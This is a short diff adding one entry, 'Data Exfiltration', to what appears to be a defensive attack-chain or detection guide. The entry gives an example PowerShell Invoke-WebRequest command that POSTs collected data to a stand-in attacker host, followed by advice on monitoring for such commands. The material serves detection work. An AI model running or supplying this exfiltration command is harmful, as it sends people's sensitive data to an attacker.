@@ -1,0 +1,6 @@
+
+8. **Data Exfiltration**
+   - Application: PowerShell
+   - User Action: The payload uses PowerShell to exfiltrate sensitive data back to the attacker.
+   - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/exfiltrate -Method POST -Body $data`
+   - Detection: Monitor for PowerShell commands that send data to external servers, especially those with POST methods.
